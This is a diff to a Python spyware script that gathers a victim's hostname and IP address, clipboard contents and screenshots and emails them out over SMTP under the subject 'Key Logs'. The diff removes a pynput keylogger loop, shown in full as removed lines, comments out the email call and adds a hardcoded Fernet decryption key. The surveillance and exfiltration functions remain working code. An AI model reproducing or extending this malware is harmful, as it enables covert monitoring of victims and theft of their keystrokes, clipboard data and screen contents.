@@ -1,6 +1,4 @@
-import pynput
 
-from pynput.keyboard import Key, Listener
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -14,8 +12,6 @@ import win32clipboard
 
 import time
 import os
-
-from cryptography.fernet import Fernet
 
 import getpass
 from requests import get
@@ -40,12 +36,10 @@ system_info = "system.txt"
 clipboard_info = "clipboard.txt"
 
 # variable declaration for screenshot
-screenshot_info = "screenshot.txt"
+screenshot_info = "screenshot.png"
 
-# variable declarations for keylog
-# count to check if key is pressed then written to, keys to hold the keys
-count = 0
-keys = []
+# decrypt variable declaration
+key = "7LBG7bqMkRqedGjS3h717rgono_TlKbRaxZVBzGCZXM="
 
 # sending email functionality 
 def send_email(filename, attachment, toaddr):
@@ -53,8 +47,8 @@ def send_email(filename, attachment, toaddr):
     msg = MIMEMultipart()
     msg['From'] = from_addr
     msg['To'] = to_addr
-    msg['Subject'] = "Logs"
-    body = "Body of Mail"
+    msg['Subject'] = "Key Logs"
+    body = "Information provided in attachemnt below"
     msg.attach(MIMEText(body, 'plain'))
     filename = filename
     attachment = open(attachment, 'rb')
@@ -73,7 +67,7 @@ def send_email(filename, attachment, toaddr):
     # end the session
     s.quit()
 
-send_email(key_log, file_path + extend + key_log, to_addr)
+#send_email(key_log, file_path + extend + key_log, to_addr)
 
 # grabbing computer information function
 def comp_info():
@@ -93,8 +87,6 @@ def comp_info():
         file.write("Hostname: " + hostname + "\n")
         file.write("Private IP Address: " + ip_addr)
 
-comp_info()
-
 # paste the users clipboard data onto a file
 def copy_clipboard():
     with open(file_path + extend + clipboard_info, "a") as file:
@@ -106,42 +98,7 @@ def copy_clipboard():
         except:
             file.write("Clipboard can not be copied")
 
-copy_clipboard()
-
 # grab a shot of the users screen
 def screenshot():
     img = ImageGrab.grab()
     img.save(file_path + extend + screenshot_info)
-
-screenshot()
-
-# basic key logger functionality
-def on_press(key):
-    global keys, count
-
-    keys.append(key)
-    count += 1
-    print("{0} pressed".format(key))
-    if count > 0:
-        count = 0
-        write_file(keys)
-        keys = []
-
-def write_file(keys):
-    with open("log.txt", "a") as file:
-        for key in keys:
-            # getting rid of ' from the string
-            k = str(key).replace("'", "")
-            # getting rid of spaces
-            if k.find("space") > 0:
-                file.write('\n')
-            elif k.find("Key") == -1:
-                file.write(k)
-
-def on_release(key):
-    if key == Key.esc:
-        return False
-
-## on_press = key is press on_release = key is released
-with Listener(on_press=on_press, on_release = on_release) as listener:
-    listener.join()
